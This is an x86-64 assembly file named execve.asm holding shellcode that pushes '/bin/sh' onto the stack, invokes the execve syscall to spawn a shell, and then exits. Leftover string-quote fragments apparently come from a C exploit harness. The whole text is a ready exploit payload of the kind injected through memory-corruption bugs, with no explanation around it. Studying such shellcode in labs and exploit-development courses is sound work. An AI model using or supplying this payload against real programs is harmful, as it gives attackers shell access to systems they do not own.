// File name: execve.asm

mov rax, 0x68732f6e69622f	#/bin/sh\n"
push rax\n"
mov rdi, rsp  # rdi = '/bin/sh'\n"
xor rsi, rsi  # rsi = NULL\n"
xor rdx, rdx  # rdx = NULL\n"
mov rax, 0x3b # rax = sys_execve\n"
syscall       # execve('/bin/sh', null, null)\n"
xor rdi, rdi   # rdi = 0\n"
mov rax, 0x3c	# rax = sys_exit\n"
syscall        # exit(0)");
